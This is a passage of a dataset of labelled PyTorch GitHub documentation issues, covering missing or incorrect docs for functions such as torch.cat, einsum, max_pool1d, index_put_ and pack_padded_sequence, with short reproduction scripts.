**storage** data to the destination depending on the sparsity of the tensor. Say, if the tensor is just a view of the 1st row of another tensor that contains 100 rows, RPC would clone the tensor and just send the data in the 1st row. If, however, if the tensor is a view of the first 60 rows, RPC would send the entire storage. This is an internal optimization to balance memory overhead vs comm overhead. As @lw pointed out in [this comment](https://github.com/pytorch/pytorch/pull/35483#discussion_r400196335), this will have user-visible differences and it's important that we have a clear design on this behavior and clarify that in our API docs. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\ntorch::cat is missing documentation? Following this link, where I searched for the documentation only returned other functions where torch::cat are begin used in the body?\r\n\r\nhttps://pytorch.org/cppdocs/search.html?q=torch%3A%3Acat&check_keywords=yes&area=default\r\n"},{"labels":[null,null,"documentation",null,null],"text":"Motivating PR: https://github.com/pytorch/pytorch/pull/33596\r\n\r\n@albanD @ezyang Should we have a separate docs page (at least) about fp16 quirks, given that new built-in autocast support has been merged? Another related issue: https://github.com/pytorch/pytorch/pull/35594\r\n\r\nIt would also be nice to discuss some global hooks that can replace inf/nan in output/grad by zero, especially when a third-party library is used under the hood that doesn't allow to swap epsilons easily (or some epsilon factory, but that's more complicated).\r\nTwo related issues: https://github.com/pytorch/pytorch/issues/31829 https://github.com/pytorch/pytorch/issues/31557\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\nIs there a reason that `torch.isclose()` is undocumented or should it be added?\r\n"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nWhen doing einsum with the equation `'abcdefghijklmnopt,qrsp,qrso,qrsn,qrsm,qrsl,qrsk,qrsj,qrsi,qrsh,qrsg,qrsf,qrse,qrsd,qrsc,qrsb,qrsa->qrst'`, if I move the `abcdefghijklmnopt` argument to the front, pytorch allocates a significantly different amount of memory.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Run the following script\r\n```python\r\nimport torch\r\nbig_core = torch.randn(\r\n    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,\r\n    dtype=torch.float64, device=\"cuda\", requires_grad=True\r\n)\r\nbatches_of_small_cores = [\r\n    torch.randn(8, 25, 25, 2, dtype=torch.float64, device=\"cuda\", requires_grad=True)\r\n    for _ in range(16)\r\n]\r\n\r\nresult = torch.einsum(\r\n    'qrsp,qrso,qrsn,qrsm,qrsl,qrsk,qrsj,qrsi,qrsh,qrsg,qrsf,qrse,qrsd,qrsc,qrsb,qrsa,abcdefghijklmnopt->qrst', *batches_of_small_cores, big_core\r\n)\r\n\r\npeak_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.peak\"] / 1024 / 1024 / 1024\r\nprint(peak_allocated_GiB)\r\ntotal_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.allocated\"] / 1024 / 1024 / 1024\r\nprint(total_allocated_GiB)\r\n# peak allocated GiB: 4.9                                                                                                                                                                            \r\n# total allocated GiB: 4.9\r\n```\r\n2. Run the following script, which differs only in `einsum` arguments order.\r\n```python\r\nimport torch\r\nbig_core = torch.randn(\r\n    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,\r\n    dtype=torch.float64, device=\"cuda\", requires_grad=True\r\n)\r\nbatches_of_small_cores = [\r\n    torch.randn(8, 25, 25, 2, dtype=torch.float64, device=\"cuda\", requires_grad=True)\r\n    for _ in range(16)\r\n]\r\n\r\nresult = torch.einsum(\r\n    'abcdefghijklmnopt,qrsp,qrso,qrsn,qrsm,qrsl,qrsk,qrsj,qrsi,qrsh,qrsg,qrsf,qrse,qrsd,qrsc,qrsb,qrsa->qrst', big_core, *batches_of_small_cores\r\n)\r\n\r\n\r\npeak_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.peak\"] / 1024 / 1024 / 1024\r\nprint(peak_allocated_GiB)\r\ntotal_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.allocated\"] / 1024 / 1024 / 1024\r\nprint(total_allocated_GiB)\r\n# peak allocated GiB: 6.1                                                                                                                                                                            \r\n# total allocated GiB: 7.3\r\n```\r\n3. Notice that the amount of allocated memory is significantly different.\r\n\r\n## Expected behavior\r\n\r\nI expected the second script to allocate the same amount of memory as the first script.\r\n\r\n## Environment\r\n\r\n* PyTorch version: 1.4.0\r\n* Is debug build: No\r\n* CUDA used to build PyTorch: 10.1\r\n* OS: Debian GNU/Linux 10 (buster)\r\n* GCC version: (Debian 8.3.0-6) 8.3.0\r\n* CMake version: version 3.13.4\r\n* Python version: 3.8\r\n* Is CUDA available: Yes\r\nCUDA runtime version: 9.2.148\r\n* GPU models and configuration: \r\n* GPU 0: Graphics Device\r\n* GPU 1: GeForce GTX 1070\r\n* Nvidia driver version: 418.74\r\n* cuDNN version: Could not collect\r\n* Versions of relevant libraries:\r\n* [pip3] numpy==1.16.2\r\n* [conda] mkl                       2020.0                      166  \r\n* [conda] pytorch                   1.4.0           py3.8_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n* [conda] torchvision               0.5.0                py38_cu101    pytorch\r\n"},{"labels":["documentation",null,null],"text":"with [1.4 stable](https://pytorch.org/docs/stable/torch.html#torch.max), both max and min are broken\r\n\r\n<img width=\"880\" alt=\"Screen Shot 2020-03-23 at 1 10 07 PM\" src=\"https://user-images.githubusercontent.com/16999635/77343167-a776c980-6d07-11ea-9f1a-1e4621228f18.png\">\r\n\r\non [master](https://pytorch.org/docs/master/torch.html#torch.min), min is broken\r\n\r\n<img width=\"875\" alt=\"Screen Shot 2020-03-23 at 1 13 23 PM\" src=\"https://user-images.githubusercontent.com/16999635/77343563-413e7680-6d08-11ea-8042-faaa845d90bc.png\">\r\n\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\nWhen I use function `torch::randint()` it takes arguments `int64_t high, at::IntArrayRef size, at::TensorOptions &options = {}` however, at the documentation it says there should also be a `at::Generator generator`\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1ad86f0f5e4b92098660b54e584342a188.html?highlight=randint\r\n\r\nI am using libtorch 1.4\n\ncc @yf225"},{"labels":[null,"documentation",null],"text":"The current documentation of `torch.autograd.functional` follows that same practice as other places: create random Tensors and print them.\r\nWe could improve that by:\r\n- Use hard coded values to make them more readable and easily reproducible\r\n- Find a way to test that the docstring example stays up to date with what the function does?\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe old build variables NO_CUDA and NO_DISTRIBUTED are referenced in CONTRIBUTING.md\r\n\r\n"},{"labels":[null,"documentation",null,null,null],"text":"NumPy has utilities that allow to create an array from a ctypes pointer in pure Python (without C++ extensions):\r\n- https://docs.scipy.org/doc/numpy/reference/routines.ctypeslib.html#module-numpy.ctypeslib\r\n- https://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.ctypes.html\r\n\r\nIn C++ land, it seems that [`torch::from_blob`](https://pytorch.org/cppdocs/api/function_namespacetorch_1ad7fb2a7759ef8c9443b489ddde494787.html#function-documentation) should do the trick, but it has no binding to Python.\r\n\r\nI propose to have utilities that would allow to do without passing by NumPy first or creating a C++ extension for a single-function `torch::from_blob` call, i.e. Python binding for `torch::from_blob` (that exist in java bindings btw), potentially with a custom deleter.\r\n\r\nContext: I'd like to make a very thin ffmpeg audio-reading wrapper: the C code would do that allocation, return it to calling code, and the calling code would be responsible to free that memory. Pseudocode for NumPy (I still need to fix the C code) is here: https://github.com/vadimkantorov/audioprimer/blob/master/decode_audio.py . Ideally I'll have a single C file that's independent of NumPy/Torch and just slightly different versions of interfacing with it. I can think of some alternatives for this particular case, but Python way of creating a tensor from a raw ctypes pointer still may be useful for existing ctypes codebases."},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the parameter description of `total_steps` in the class `OneClassLR` it says\r\n> The total number of steps in the cycle. Note that if a value is provided here, then it must be inferred by providing a value for epochs and steps_per_epoch. Default: None\r\n\r\nShouldn't that be \r\n> The total number of steps in the cycle. Note that if a value is **not** provided here, then it must be inferred by providing a value for epochs and steps_per_epoch. Default: None\r\n\r\nThe corresponding line in the source code. https://github.com/pytorch/pytorch/blob/4f62cbe7de8f867809ca601c996dd48a5a28ffca/torch/optim/lr_scheduler.py#L1046\n\ncc @vincentqb"},{"labels":["documentation",null],"text":"Categorical distribution is also called multinoulli distribution, instead of multinomial.\r\nAt the beginning of the page, under title \"score function\""},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe current documentation still copyrights PyTorch for 2019. This can be seen on the [documentation for master](https://pytorch.org/docs/master/) near the bottom.\r\n\r\nNote: I addressed this in PR #34291 along with some other documentation issues. This one stands out as it makes information appear to be outdated."},{"labels":["documentation",null],"text":"No docs online: https://pytorch.org/docs/master/search.html?q=conv_tbc&check_keywords=yes&area=default\r\n\r\nDocstring in code:\r\nhttps://github.com/pytorch/pytorch/blob/857eb4145e603db0941eb115e28e3aae654c49f8/torch/nn/functional.py#L212\r\n\r\nCode: https://github.com/pytorch/pytorch/blob/877c96cddfebee00385307f9e1b1f3b4ec72bfdc/aten/src/ATen/native/ConvolutionTBC.cpp\r\n\r\nIn general, is there a benchmark on `conv1d` vs `conv_tbc`?\r\n\r\nDoes `conv_tbc` get called under the hood of `conv1d` if TBC memory layout is detected?"},{"labels":["documentation",null],"text":"Note that on cpu both `inf` and `-inf` produce a negative number (int64_min)\r\n```python\r\nimport torch\r\n\r\nprint(torch.tensor(float('inf'), device = 'cpu', dtype = torch.float32).long())\r\n# tensor(-9223372036854775808)\r\nprint(torch.tensor(float('-inf'), device = 'cpu', dtype = torch.float32).long())\r\n# tensor(-9223372036854775808)\r\n\r\nprint(torch.tensor(float('inf'), device = 'cuda', dtype = torch.float32).long())\r\n# tensor(9223372036854775807, device='cuda:0')\r\nprint(torch.tensor(float('-inf'), device = 'cuda', dtype = torch.float32).long())\r\n# tensor(-9223372036854775808, device='cuda:0')\r\n\r\nprint(torch.tensor(float('inf'), device = 'cuda', dtype = torch.float16).long())\r\n# tensor(9223372036854775807, device='cuda:0')\r\nprint(torch.tensor(float('-inf'), device = 'cuda', dtype = torch.float16).long())\r\n# tensor(-9223372036854775808, device='cuda:0')\r\n```\r\n\r\nThe mere possibility of converting inf/-inf to long is already doubtful (and probably worth a mention in the docs somewhere)"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/torch.html?highlight=torch%20full#torch.full\r\n\r\n`fill_value – the number to fill the output tensor with.`\r\n\r\nthe arg spec or the arg description doesn't specify if the \"number\" must be Python scalar or if Torch scalar is also fine. It also doesn't specify if the device of the Torch scalar must match the device passed to the `full(...)` call and if gradient to `fill_value` is backpropped, Wording `number` is quite vague.\r\n\r\nAlso argument name `size` is used - maybe better to replace it with `shape`? `shape` property name was adopted long time ago, and even NumPy uses `shape` in the similar method: https://docs.scipy.org/doc/numpy/reference/generated/numpy.full.html"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nWhen browsing through the docs on normalization layers, I realized that `torch.nn.functional.group_norm` is missing from the documentation (the `torch.nn.GroupNorm` layer counterpart is there). I am wondering why it is missing. My guess would be that this is not the intended behaviour.\r\n"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/torch.html?highlight=meshgrid#torch.meshgrid\r\n\r\narg spec has some \"**kwargs\", but it's not described in the doc string and there is no code example \r\n\r\nI think it should be removed"},{"labels":[null,"documentation",null,null],"text":"https://pytorch.org/cppdocs/api/function_namespacetorch_1a99dc9f736064b2179cc58e6436f7a021.html#exhale-function-namespacetorch-1a99dc9f736064b2179cc58e6436f7a021\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1a4b369494adfb10b9a005aeb0bb6207cb.html#exhale-function-namespacetorch-1a4b369494adfb10b9a005aeb0bb6207cb\r\n\r\nsee issue: https://github.com/pytorch/pytorch/issues/33862#issuecomment-593518890\n\ncc @yf225 @vincentqb"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/tensors.html#torch.Tensor.index_put_\r\n\r\n`\r\nPuts values from the tensor value into the tensor self using the indices specified in indices (which is a tuple of Tensors). The expression tensor.index_put_(indices, value) is equivalent to tensor[indices] = value\r\n`\r\n\r\nHowever if we follow the suggested link [indices](https://pytorch.org/docs/master/tensors.html#torch.Tensor.indices), it only explains something about sparse tensors: `If self is a sparse COO tensor (i.e., with torch.sparse_coo layout), this returns a view of the contained indices tensor. Otherwise, this throws an error.`\r\n\r\nSo this (the suggested indices link + phrasing \"using the indices specified in indices\" and the requirement to use a tuple of tensors) is a confusing reference when `index_put_` is to be used with dense tensors.\r\n\r\nIf the function is not normally expected to be used with dense tensors, a notice about that would be a great clarification.\r\n```python\r\na = torch.rand(3)\r\na.index_put_((torch.tensor(-1), ), torch.tensor(0.0)) # notice a lot of wrapper torch.tensor calls and the required tuple\r\n```\r\n\r\nIn the doc it mentions that the op is equivalent to `tensor[indices] = value`, so naturally I first tried the call `a.index_put_(-1, 0)` for zeroing out the last tensor element and it failed badly."},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/tensors.html#torch.Tensor.scatter_\r\n\r\n1. The function signature `scatter_(dim, index, src) → Tensor` has no mention of `value`, so it is confussing to find it in argument spec. I think it'd be clearer if the argument spec just mentioned that `src` can be a scalar:\r\n```\r\nsrc (Tensor) – the source element(s) to scatter, incase value is not specified\r\nvalue (float) – the source element(s) to scatter, incase src is not specified\r\n```\r\nThe function description also has no mention of `value`.\r\n 2. Typo: 'incase\" in one word"},{"labels":[null,null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe documentation webpage is ridiculously heavy (~300MB on Chrome) and will crash any phone's browser. Can we section it into smaller chunks?\r\n\r\n<img width=\"514\" alt=\"Screenshot 2020-02-29 22 02 32\" src=\"https://user-images.githubusercontent.com/2119355/75618659-82939a00-5b3f-11ea-8d57-a01994277f22.png\">\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null],"text":"## 🐛 Can't save to ostream\r\n\r\nI want to save my model as a `istream` for later processing.\r\nI found the following on the api:\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1a99dc9f736064b2179cc58e6436f7a021.html#exhale-function-namespacetorch-1a99dc9f736064b2179cc58e6436f7a021\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1a4b369494adfb10b9a005aeb0bb6207cb.html#exhale-function-namespacetorch-1a4b369494adfb10b9a005aeb0bb6207cb\r\n\r\n## To Reproduce\r\n`torch::optim::SGD sgd(0.9);` give me error: \r\n\r\n>Error (active)\tE0289\tno instance of constructor \"torch::optim::SGD::SGD\" matches the argument list\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): LibTorch 1.4\r\n - OS (e.g., Linux): Windows 7 64 bit\r\n - How you installed PyTorch (`conda`, `pip`, source): source: https://download.pytorch.org/libtorch/cpu/libtorch-win-shared-with-deps-1.4.0.zip\r\n - Build command you used (if compiling from source): cmake --build . --config Release --target INSTALL\r\n - Python version: 3.6\r\n - CUDA/cuDNN version: NA\r\n - GPU models and configuration: NA\r\n - Any other relevant information: NA\r\n\r\n\n\ncc @yf225"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation on PyTorch Profiler\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nI don't fully understand the output of [PyTorch Profiler](https://pytorch.org/docs/stable/autograd.html#torch.autograd.profiler.profile) after using `torch.autograd.profiler` (combined with `torch.autograd.profiler.record_function` for labeling). To be specifically, the output of `prof.key_averages().table(sort_by=\"cuda_time_total\")` gets the following table:\r\n\r\n| Name | Self CPU total % | Self CPU total | CPU total % | CPU total | CPU time avg | CUDA total % | CUDA total | CUDA time avg | Number of Calls |\r\n| ---- | ---------------- | -------------- | ----------- | --------- | ------------ | ------------ | ---------- | ------------- | --------------- |\r\n|      |                  |                |             |           |              |              |            |               |                 |\r\n\r\nIt seems the document doesn't explain much for the clear meanings of each item. To be concretely, I will very appreciate if the document can provide answers to the following questions:\r\n\r\n1. What's the meaning and the difference of `Self CPU total` and `CPU total`\r\n2. Is the `CUDA total` purely the execution time for the cuda code? Or it also includes time of kernel launching, kernel queueing in GPU? \r\n3. How can I understand the `CPU total` for operations which are executed on GPU, e.g., model forwarding and backwarding. Since these operations are done in GPU, but I still find even unneglectable time cost spent by CPU.\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":[null,null,"documentation",null],"text":"This page is 404:\r\nhttp://docs.pytorch.org/\r\n\r\nThis can be confusing, and we should issue a redirect to pytorch.org/docs\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThe docs of `MultiplicativeLR` use `LambdaLR` as example, instead, `MultiplicativeLR` itself should be used.\r\n\r\nThe issue exists in docs of `MultiplicativeLR`:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/4460c8b034f8fd544ff9c271c4aa21698644d352/torch/optim/lr_scheduler.py#L238-L257\r\n\r\nin line 252, it should use `MultiplicativeLR` as example: \r\n\r\nhttps://github.com/pytorch/pytorch/blob/4460c8b034f8fd544ff9c271c4aa21698644d352/torch/optim/lr_scheduler.py#L252\r\n\r\nIt seems that this example was copied from `LambdaLR` but hasn't been correctly edited.\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\ntorch/nn/utils/rnn.html:\r\n\r\n`pad_packed_sequence` doc has a confusing stand-alone statement in the description of the function:\r\n\r\n> Batch elements will be ordered decreasingly by their length.\r\n\r\nOrdered when and where? \r\n\r\nOn the contrary the padded output is \"unsorted\" to how it was originally sorted when `pack_padded_sequence` or `pack_sequence` were called. So the statement in question is only correct if the original sequence was ordered decreasingly by the length of its elements and isn't necessarily the case with `enforce_sorted=False`.\r\n\r\nPerhaps it should say instead:\r\n\r\n> Batch elements will be re-ordered as they were ordered originally when the batch was passed to `pack_padded_sequence` or `pack_sequence`.\r\n\r\nBut then it's possible that  `sequence.unsorted_indices` is `None`, in which case no sorting will happen.\r\n\r\nAnd perhaps the sorting note would be better serving in the `Returns` part of the description?\r\n\r\nExample:\r\n\r\n```\r\nseq = torch.tensor([[1,2,3,0], [4,5,0,0], [6,3,5,1]])\r\nlens = [3, 2, 4]\r\npacked = pack_padded_sequence(seq, lens, batch_first=True, enforce_sorted=False)\r\npacked\r\nseq_unpacked, lens_unpacked = pad_packed_sequence(packed, batch_first=True)\r\nseq_unpacked\r\nlens_unpacked\r\n```\r\n```\r\nPackedSequence(data=tensor([6, 1, 4, 3, 2, 5, 5, 3, 1]), batch_sizes=tensor([3, 3, 2, 1]), sorted_indices=tensor([2, 0, 1]), unsorted_indices=tensor([1, 2, 0]))\r\ntensor([[1, 2, 3, 0],\r\n        [4, 5, 0, 0],\r\n        [6, 3, 5, 1]])\r\ntensor([3, 2, 4])\r\n```\r\ni.e. everything is nicely restored to the original order (which is not ordered by lengths).\r\n\r\nThank you."},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe docs for [index_put_](https://pytorch.org/docs/master/tensors.html#torch.Tensor.index_put_) state in the second paragraph:\r\n```\r\nIf accumulate is True, the elements in tensor are added to self. If accumulate is False, the behavior is undefined if indices contain duplicate elements.\r\n```\r\n\r\nIt should be corrected to `elements in _value_ are added to self`."},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\ntorch/nn/utils/rnn.html:\r\n\r\n`pack_padded_sequence` has a confusing and incomplete description of the `enforce_sorted` param. Currently it goes:\r\n\r\n```\r\n        enforce_sorted (bool, optional): if ``True``, the input is expected to\r\n            contain sequences sorted by length in a decreasing order. If\r\n            ``False``, this condition is not checked. Default: ``True``.\r\n```\r\n\r\nThe second part \"this condition is not checked\" (1) makes no sense since the alluded to condition is not described and (2) it's incomplete as it doesn't reflect the important part, that it actually does the sorting. I think it should say something like:\r\n\r\n```\r\n        enforce_sorted (bool, optional): if ``True``, the input is expected to\r\n            contain sequences sorted by length in a decreasing order. If\r\n            ``False``, the input will get sorted unconditionally. Default: ``True``.\r\n```\r\n\r\nI'm not sure whether it should also mention `sorted_indices` to enable recovering of the original sorting order, if one doesn't use `pad_packed_sequence` to unpack it.\r\n\r\nThanks.\n\ncc @zou3519"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nAccording to the documentation on [`nn.MaxPool1d`](https://pytorch.org/docs/stable/nn.html#torch.nn.MaxPool1d):\r\n\r\n> If `padding` is non-zero, then **the input is implicitly zero-padded on both sides** for `padding` number of points. `dilation` controls the spacing between the kernel points. It is harder to describe, but this link has a nice visualization of what `dilation` does.\r\n\r\nHowever, the input is never padded with zeros, either explicitly or implicitly. Doing a bit of source diving I found that the maximum operation [initializes with negative infinity](https://github.com/pytorch/pytorch/blob/d35a4c202e917b5d5cb67ac749fcf7931212c25b/aten/src/ATen/native/DilatedMaxPool2d.cpp#L59), not zero, and only considers entries from the original, unpadded input tensor. Therefore it would be correct to say that the max-pooling operation uses implicit negative infinity padding but not zero-padding.\r\n\r\nThis appears to be either a bug in the API or documentation (of course PEBCAK is always a possibility).\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Install PyTorch\r\n2. Run the following code\r\n```\r\n>>> import torch\r\n>>> from torch.nn.functional import max_pool1d\r\n>>> x = torch.tensor([[[-1., -2.]]])\r\n>>> max_pool1d(x, kernel_size=2, padding=1)\r\ntensor([[[-1., -2.]]])\r\n>>> max_pool1d(x.cuda(), kernel_size=2, padding=1)\r\ntensor([[[-1., -2.]]], device='cuda:0')\r\n```\r\n\r\n## Expected behavior\r\n\r\nIf zero-padding was being used we would expect the output to be `tensor([[[0., 0.]]])` since zero is larger than all the input tensor elements.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.4.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Red Hat Enterprise Linux Workstation release 7.7 (Maipo)\r\nGCC version: (GCC) 6.3.0\r\nCMake version: version 3.11.4\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: \r\nGPU 0: GeForce RTX 2080 Ti\r\nGPU 1: GeForce RTX 2080 Ti\r\n\r\nNvidia driver version: 430.40\r\ncuDNN version: 7.6.3\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.1\r\n[pip3] torch==1.4.0\r\n[pip3] torchvision==0.5.0\r\n[conda] Could not collect\r\n\r\n## Additional context\r\n\r\nThis issue is based on a [question originally asked on StackOverflow](https://stackoverflow.com/questions/60240434) by user trsvchn."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://pytorch.org/docs/stable/nn.html#lstm\r\n\r\n> output of shape (seq_len, batch, num_directions * hidden_size): tensor containing the output features (h_t) from the last layer of the LSTM, for each t. If a torch.nn.utils.rnn.PackedSequence has been given as the input, the output will also be a packed sequence.\r\n\r\nThe shape should actually be `(batch, seq_len, num_directions * hidden_size)`"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nFor example [torch.add](https://pytorch.org/docs/master/tensors.html#torch.Tensor.add) says\r\n\r\n```\r\nadd(value) → Tensor\r\n    add(other, *, value=1) -> Tensor\r\n\r\n    See torch.add()\r\n```\r\n\r\nBut indeed the value flag doesn't exist.\r\n\r\n```\r\n>>> import torch\r\n>>> a = torch.randn(1, 3)\r\n>>> b = torch.randn(1, 3)\r\n>>> a\r\ntensor([[-0.5835, -0.1405, -1.8119]])\r\n>>> b\r\ntensor([[ 0.8623, -1.3727,  1.5434]])\r\n>>> a.add(b)\r\ntensor([[ 0.2789, -1.5132, -0.2685]])\r\n>>> a.add(b, 1)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() takes 1 positional argument but 2 were given\r\n>>> a.add(b, 2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() takes 1 positional argument but 2 were given\r\n>>> a.add(b, valu=2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() got an unexpected keyword argument 'valu'\r\n>>> a.add(b, value=2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() got an unexpected keyword argument 'value'\r\n>>> a.add(b, 2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() takes 1 positional argument but 2 were given\r\n```\r\n\r\nInstead one has to use ```alpha``` as a flag.\r\n\r\n```\r\n>>> import torch\r\n>>> a = torch.randn(1, 3)\r\n>>> b = torch.randn(1, 3)\r\n>>> a.add(a, alpha=3.0)\r\ntensor([[ 3.3190, -0.4248, -3.6609]])\r\n```\r\n\r\nThere are many other instances of this in the documentation."},{"labels":["documentation",null],"text":"These aren't documented anywhere and it's unclear how they're different from `torch::save`"},{"labels":["documentation",null],"text":"```\r\ntorch.optim\r\nQuantization\r\nDistributed RPC Framework\r\ntorch.random\r\n```\r\nwhy this order? not even alphabetical. I'd suggest that big special topics such as Quantization are presented on top in a separate section, and the rest to be in alphabetical order.\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/73972687-8c035b00-4921-11ea-82a9-01c4d09cc5b3.png)"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\ndocumentation includes use of random_pruning, but there is nothing like random_pruning.\r\n```\r\nm = random_pruning(nn.Linear(5, 7), name='weight', amount=0.2)\r\nprune.random_pruning(m, name='weight', amount=0.2)\r\n```\r\nAttributeError: module 'torch.nn.utils.prune' has no attribute 'random_pruning'\r\n\r\nsame thing for remove_pruning also,\r\n```\r\n>>> m = remove_pruning(m, name='weight')\r\n```\r\nAttributeError: module 'torch.nn.utils.prune' has no attribute 'remove_pruning'"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/search.html?q=__version__&check_keywords=yes&area=default#\r\n\r\nhttps://pytorch.org/docs/master/search.html?q=version&check_keywords=yes&area=default#\r\n\r\nBoth are also missing from the doc navigation left pane (`torch.__config__` is there)\r\n"},{"labels":[null,null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n### There's no way to access api from search engine in one click.\r\n\r\nI find it's very hard to search pytorch api from search engine. A typical example would be seaching `pytorch conv2d`, the top result points to `https://pytorch.org/docs/stable/nn.html` without the heading hash `#conv2d`. \r\n\r\n<img width=\"668\" alt=\"Screen Shot 2020-01-27 at 12 28 28 PM\" src=\"https://user-images.githubusercontent.com/1488391/73486826-e0339b80-4373-11ea-8c04-93551011b107.png\">\r\n\r\nIn most cases, it's sth like the following img, where there's a `jump to xxx` link to the hashed url `https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#Body`\r\n\r\n<img width=\"794\" alt=\"Screen Shot 2020-01-30 at 2 40 14 PM\" src=\"https://user-images.githubusercontent.com/1488391/73484929-30a8fa00-4370-11ea-9ded-0355951e9e15.png\">\r\n\r\nI'm not sure what's missing here, a quick search seems to suggest search engine need an unique id in headings like `<h4 id=\"xxx\"></h4>` to tell the heading structure.\r\n\r\nThe search bar in the doc page definitely works, It's also nice to have one click search engine access.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\nJust a very small grammatical issue. \r\n![grammar_error_transformsontorch](https://user-images.githubusercontent.com/11468122/73418974-183ece00-42e3-11ea-992b-bdce07172f07.PNG)\r\nSuggested fix: \"mutates\" to \"mutate\"\r\n\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an 